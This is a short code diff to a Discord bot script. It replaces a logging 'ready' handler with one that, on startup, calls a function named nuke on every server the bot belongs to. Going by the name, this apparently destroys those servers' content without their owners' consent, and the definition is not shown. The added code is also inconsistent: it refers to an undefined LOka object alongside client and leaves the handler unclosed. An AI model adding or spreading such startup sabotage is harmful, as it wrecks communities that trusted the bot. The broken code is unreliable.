@@ -15,16 +15,13 @@ client.on("message", message => {
 };     
 });
 
-
-client.on('ready', () => {
-   console.log(`----------------`);
-      console.log(`Desert Bot- Script By : i1Suhaib`);
-        console.log(`----------------`);
-      console.log(`ON ${client.guilds.size} Servers '     Script By : i1Suhaib ' `);
-    console.log(`----------------`);
-  console.log(`Logged in as ${client.user.tag}!`);
-client.user.setStatus("dnd")
-});
-
+LOka.on('ready', () => {
+  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
+  console.log('-------------------------------------------------------------');
+  console.log('');
+  console.log("Made by int");
+  console.log("");
+  console.log("-------------------------------------------------------------");
+ 
 
 client.login(process.env.BOT_TOKEN);
